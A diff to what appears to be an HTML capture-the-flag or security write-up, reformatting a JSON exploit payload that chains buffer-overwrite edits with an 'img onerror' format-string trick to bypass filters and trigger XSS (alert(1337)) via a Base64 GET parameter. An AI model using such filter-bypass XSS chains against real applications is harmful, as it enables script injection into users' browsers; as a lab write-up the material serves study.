@@ -1090,7 +1090,22 @@ VM1601:49 Found "<article><p>%.*s</p></article>" at memory address: 65581</code>
                 <li>Watch your payload execute, bypassing all filters.</li>
             </ul>
             <p>The payload structure:</p>
-            <pre><code class="language-javascript">[{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"add","content":"hi","time":1756840476392},{"action":"edit","msgId":10,"content":"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050","time":1756885686080},{"action":"edit","msgId":0,"content":"img src=1      onerror=%.*s ","time":1756885686080},{"action":"add","content":"alert(1337)","time":1756840476392}]</code></pre>
+            <pre><code class="language-javascript">[
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"add","content":"hi","time":1756840476392},
+{"action":"edit","msgId":10,"content":"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050","time":1756885686080},
+{"action":"edit","msgId":0,"content":"img src=1      onerror=%.*s ","time":1756885686080},
+{"action":"add","content":"alert(1337)","time":1756840476392}
+]</code></pre>
             <p>
                 Finally, encode the entire payload in Base64 and pass it to the application as the 
                 <code>s</code> GET parameter.
